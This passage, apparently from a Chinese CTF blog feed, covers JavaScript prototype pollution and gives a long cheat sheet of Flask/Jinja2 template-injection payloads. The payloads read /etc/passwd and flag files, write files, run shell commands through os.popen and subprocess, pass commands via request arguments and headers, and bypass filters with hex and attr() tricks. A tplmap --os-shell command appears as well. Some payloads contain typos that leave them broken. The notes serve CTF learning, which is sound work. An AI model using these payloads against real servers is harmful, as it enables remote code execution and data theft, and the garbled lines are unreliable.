<code>Object.prototype</code></li><li><strong>Foo（构造函数本身）</strong>：继承自 <code>Function.prototype</code></li><li><strong>Function.prototype</strong>：继承自 <code>Object.prototype</code></li><li><strong>Object.prototype</strong>：继承自 <code>null</code>，原型链结束。</li></ul><h1 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">1.</span>obj1[xx]= obj2[yy] 换爹    注释: 这种写法是一种动态属性赋值方式。它的意思是，将 obj2 对象中键为 yy 的值赋给 obj1 对象中键为 xx 的属性。<br><br><span class="hljs-keyword">let</span> obj1 = &#123;&#125;;<br><span class="hljs-keyword">let</span> obj2 = &#123;<br>  <span class="hljs-attr">key1</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">key2</span>: <span class="hljs-string">&quot;value2&quot;</span><br>&#125;;<br><br><span class="hljs-comment">// 动态赋值的变量</span><br><span class="hljs-keyword">let</span> xx = <span class="hljs-string">&quot;__proto__&quot;</span>; <span class="hljs-comment">// 设置为 &quot;__proto__&quot; 来修改原型链</span><br><span class="hljs-keyword">let</span> yy = <span class="hljs-string">&quot;key1&quot;</span>; <span class="hljs-comment">// 从 obj2 中获取键为 key1 的值</span><br><br><span class="hljs-comment">// 通过原型链污染将 obj2[key1] 的值赋给 obj1.__proto__</span><br>obj1[xx] = obj2[yy];<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true, 通过原型链污染，obj1 获得了 isAdmin 属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true, 所有对象都被污染了</span><br><br><br><span class="hljs-number">2.</span>obj[xx][yy]=zz 改爹**   在 obj[xx] 返回的结果（假设是一个对象）上，再通过 yy 动态访问其属性。<br><span class="hljs-comment">// 定义一个空对象 obj</span><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><br><span class="hljs-comment">// 设置动态变量</span><br><span class="hljs-keyword">let</span> xx = <span class="hljs-string">&quot;__proto__&quot;</span>;  <span class="hljs-comment">// 用来修改对象的原型链</span><br><span class="hljs-keyword">let</span> yy = <span class="hljs-string">&quot;isAdmin&quot;</span>;    <span class="hljs-comment">// 我们要在原型链上添加的属性</span><br><span class="hljs-keyword">let</span> zz = <span class="hljs-literal">true</span>;         <span class="hljs-comment">// 要赋的值</span><br><br><span class="hljs-comment">// 使用 obj[xx][yy] = zz 改爹法修改原型链</span><br>obj[xx][yy] = zz;<br><br><span class="hljs-comment">// 现在任何通过 Object 创建的对象都继承了 isAdmin 属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>);  <span class="hljs-comment">// true, 所有新对象也被污染了</span><br>+<br><br><br> <span class="hljs-number">2.</span><span class="hljs-title function_">merge</span>() 函数的原型链污染<br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><span class="hljs-title function_">merge</span>(obj, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// 输出 &quot;malicious value&quot;</span><br><br><br><br><span class="hljs-number">4.</span>lodash.<span class="hljs-title function_">merge</span>() 的原型链污染<br><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>_.<span class="hljs-title function_">merge</span>(obj, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// 输出 &quot;malicious value&quot;</span><br><br><br><span class="hljs-number">5.</span> <span class="hljs-title function_">set</span>() 和 <span class="hljs-title function_">update</span>()<br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// 假设有个深度更新的库函数 `set`</span><br><span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;key&#x27;</span>, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// 输出 &quot;malicious value&quot;</span><br><br><br></code></pre></td></tr></table></figure><p>your[req.body.key] &#x3D; req.body.value</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&#x27;__proto__&#x27;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;isAdmin&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;<br>对key__proto__过滤传&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">[[&#x27;__proto__&#x27;]]</span>&#125;试试<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2024/09/01/SSTI/"/>
    <url>/2024/09/01/SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a><code>SSTI</code></h1><p><code>$&#123;7*7&#125;</code></p><ul><li><code>y a&#123;*comment*&#125;b</code><ul><li><code>y Smarty</code></li><li><code>n $&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125; -&gt; Mako</code></li><li><code>n &#123;&#123;7*7&#125;&#125;</code><ul><li><code>y &#123;&#123;7*'7'&#125;&#125; -&gt; jinja2 Twig</code></li><li><code>n</code></li></ul></li></ul></li></ul><h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a><code>Flask</code></h1><h2 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a><code>内置方法</code></h2><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs leaf">- __class__: 返回当前对象所属的类。例：&quot;&quot;.__class__  <span class="hljs-punctuation">#</span> &lt;class &#x27;str&#x27;&gt;<br>- __bases__: 以元组的形式返回该类的直接父类。例：&quot;&quot;.__class__.__bases__ <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">object</span>&#x27;<span class="hljs-operator">&gt;</span>,)</span><br>- __base__: 以字符串形式返回该类的基类(Object)。例：&quot;&quot;.__class__.__base__ <span class="hljs-punctuation">#</span>&lt;class &#x27;object&#x27;&gt;<br>- __mro__: 以元组的形式返回解析方法的调用顺序。例：&quot;&quot;.__class__.__mro__ <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">str</span>&#x27;<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">object</span>&#x27;<span class="hljs-operator">&gt;</span>)</span><br>- __subclasses__(): 返回类的所有子类，通常配合__class__，__base__来获取执行命令或文件操作的类。 例：().__class__.__base__.__subclasses__()<br>- __init__: 返回初始化对象。<br>- __globals__: 以字典的形式返回当前空间下的所有可使用模块、方法以及所有变量。<br>- __builtins__: 返回当前所有导入的内置函数。<br></code></pre></td></tr></table></figure><h2 id="找到链再进行过滤绕过"><a href="#找到链再进行过滤绕过" class="headerlink" title="找到链再进行过滤绕过"></a><code>找到链再进行过滤绕过</code></h2><h3 id="找到object对象"><a href="#找到object对象" class="headerlink" title="找到object对象"></a><code>找到object对象</code></h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> &#x27;&#x27;.<span class="hljs-strong">__class__</span>.mro<span class="hljs-strong">__[1]</span><br><span class="hljs-strong">- &#123;&#125;.__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br><span class="hljs-strong">- ().__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br><span class="hljs-strong">- [].__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br></code></pre></td></tr></table></figure><h3 id="获取所有有用的class"><a href="#获取所有有用的class" class="headerlink" title="获取所有有用的class"></a><code>获取所有有用的class</code></h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">- <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()<br>- &#123;&#125;.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- ().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- &#123;&#123; [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>() &#125;&#125;<br>- &#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">___mro__</span>()[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;<br>- &#123;&#123; <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><code>文件读取</code></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.items</span>()[4][1].__class__.__mro__[2].__subclasses__()[40](<span class="hljs-name">&quot;/tmp/flag&quot;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">get_flashed_messages.__globals__.__builtins__.open</span>(<span class="hljs-name">&quot;/etc/passwd&quot;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"> Python3: 在该版本中file类被删除了，不过可以利用_frozen_importlib_external.FileLoader来读取文件：</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__mro__[1].__subclasses__()[94].get_data(0,&quot;test.txt&quot;)</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__mro__</span>[1].__subclasses__()[79][&quot;get_data&quot;](<span class="hljs-name">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- `&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">原理都是一样的，只不过环境变化有点大，并且Windows与Linux下也有差异，可编写脚本遍历：</span><br><span class="language-xml"></span><br><span class="language-xml">- 脚本遍历 object 类的所有子类，查找包含 &#x27;FileLoader&#x27; 的类名，然后使用其 get_data 方法读取 test.txt 文件的内容并解码：</span><br><span class="language-xml">- &#123;% for x in [].__class__.__mro__[1].__subclasses__() %&#125;&#123;% if &#x27;FileLoader&#x27; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">x</span>().get_data(<span class="hljs-name">x</span>(), <span class="hljs-string">&#x27;test.txt&#x27;</span>).decode() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">### 文件写入</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__base__.__base__.__subclasses__()[40](&#x27;/tmp/1&#x27;,&#x27;w&#x27;).write(&#x27;hello&#x27;)</span><br></code></pre></td></tr></table></figure><h1 id="动态执行，例如-input-ls"><a href="#动态执行，例如-input-ls" class="headerlink" title="动态执行，例如 ?input=ls"></a><code>动态执行，例如 ?input=ls</code></h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;% for x in().__class__.__base__.__subelasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>().__module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="查找想要的模块"><a href="#查找想要的模块" class="headerlink" title="查找想要的模块"></a><code>查找想要的模块</code></h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>.<span class="hljs-strong">__subelasses__</span>().index(模块名)<br><span class="hljs-bullet">-</span> 查找想要的模块:<br><span class="hljs-bullet">  -</span> num=0<br><span class="hljs-bullet">  -</span> for item in &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>():<br><span class="hljs-bullet">    -</span> try:<br><span class="hljs-bullet">      -</span> if &#x27;popen&#x27; in item.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>:<br><span class="hljs-bullet">        -</span> print(num,item)<br><span class="hljs-bullet">      -</span> num+=1<br><span class="hljs-bullet">    -</span> except:<br><span class="hljs-bullet">      -</span> num+=1<br><span class="hljs-bullet">-</span> &#123;% set num = 0 %&#125;&#123;% for item in &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if &#x27;popen&#x27; in item.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span> %&#125;&#123;&#123; num &#125;&#125;: &#123;&#123; item &#125;&#125;&#123;% endif %&#125;&#123;% set num = num + 1 %&#125;&#123;% endfor %&#125;<br><br>获取全局配置：&#123;&#123;config&#125;&#125;<br></code></pre></td></tr></table></figure><p><code>tplmap工具：</code></p><ul><li><code>测试是否存在ssti：python2 tplmap.py –u &quot;xx&quot;</code></li><li><code>执行模板获取shell：python2 tplmap.py  -u &quot;xx&quot; --engine=jinja2 --os-shell</code></li></ul><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a><code>常用payload</code></h2><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2:"></a><code>Python2:</code></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">- 读文件: ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">r&#x27;/flag&#x27;</span> ).read()<br>- 命令执行: ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">50</span>].__init__.__func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )<br></code></pre></td></tr></table></figure><h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3:"></a><code>Python3:</code></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;1s&#x27;)</span><br><span class="language-xml">- &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="language-xml">- [].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;system&#x27;](&#x27;ls&#x27;)</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">lipsum.__globals__</span>[&quot;os&quot;].popen(<span class="hljs-name">&#x27;id&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&quot;cmd&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">- *url_for.__globals__.os.__dict__.popen(request.args.file).read()，然后传参file，内容为要执行的命令</span><br><span class="language-xml">-* url_for.__globals__.os.environ, 拿环境变量</span><br><span class="language-xml">- *config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)，参数a是要导入的模块（os），参数b是环境变量名（把getenv换了就能执行别的了）http://example.com/?a=os&amp;b=HOME从请求参数 a 中指定的模块导入该模块，然后使用 request.args.b 作为参数调用 getenv 函数，获取环境变量的值并将其输出</span><br><span class="language-xml">- ().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ      148  warnings.catch_warnings    ?b=eval&amp;c=&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span><br><span class="language-xml">- ().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()     </span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&quot;\x5F\x5Fclass\x5F\x5F&quot;]</span>[&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](<span class="hljs-name">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- *</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&quot;&quot;.__class__.__base__</span> .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">request.args.get</span>(<span class="hljs-name">&quot;cmd&quot;</span>)).read()&#125;&#125;</span><span class="language-xml">   get?cmd=cat /flag</span><br><span class="language-xml"></span><br><span class="language-xml">- 如果你想执行 ls 命令，可以将 (0x65,0x78,0x70,0x72,0x74) 替换为 (0x6c, 0x73)，即：</span><br><span class="language-xml"></span><br><span class="language-xml">​          </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.mro</span>()[1].__subclasses__()[337](<span class="hljs-name">get_flashed_messages.__class__.__mro__</span>[1].__subclasses__()[3]((<span class="hljs-name">0x6c</span>, <span class="hljs-number">0</span>x73)).decode(),<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml">这段代码将执行 ls 命令，并返回当前目录的内容。</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(%<span class="hljs-name">27application</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fglobals\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27</span>\x5f\x5fbuil%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>tins\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27</span>\x5f\x5fimp%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>ort\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27os</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27po</span>%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>pen%<span class="hljs-number">27</span>)(%<span class="hljs-name">27cmd</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27read</span>%<span class="hljs-number">27</span>)()&#125;&#125;</span><span class="language-xml"> 使用时把cmd换成命令如ls</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">22</span>%<span class="hljs-number">22</span>|attr(%<span class="hljs-name">27</span>\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5f\x62\x61\x73\x65\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%<span class="hljs-number">27</span>)()|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(<span class="hljs-name">411</span>)(%<span class="hljs-name">27cmd</span>%<span class="hljs-number">27</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1)|attr(%<span class="hljs-name">27communicate</span>%<span class="hljs-number">27</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self</span>|attr(<span class="hljs-name">&quot;\x5f\x5fdict\x5f\x5f&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- *可以用自定义header传命令：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">joiner.__init__.__globals__.os.popen</span>(<span class="hljs-name">request.headers.cmd</span>).read()&#125;&#125;</span><span class="language-xml">,然后header里添加cmd: cat flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">455</span>)(<span class="hljs-name">request.args.shell</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=(<span class="hljs-name">1</span>).__neg__()).communicate()&#125;&#125;</span><span class="language-xml">:     用getitem绕[]过滤，(1).__neg__()绕负号过滤</span><br><span class="language-xml"></span><br><span class="language-xml">- 过滤方括号、下划线及引号。利用lipsum逃逸，|attr()代替方括号，并将带有下划线的项放在请求头，用request.pragma.0访问（有些header里面没法放下划线，Pragma可以，所以用多个Pragma传递带有下划线的项，数字表示第i个Pragma里的内容）</span><br><span class="language-xml"></span><br><span class="language-xml"> * </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.pragma.0</span>)|attr(<span class="hljs-name">request.pragma.1</span>)(<span class="hljs-name">request.pragma.2</span>)|attr(<span class="hljs-name">request.pragma.3</span>)(<span class="hljs-name">request.pragma.4</span>)|attr(<span class="hljs-name">request.pragma.5</span>)(<span 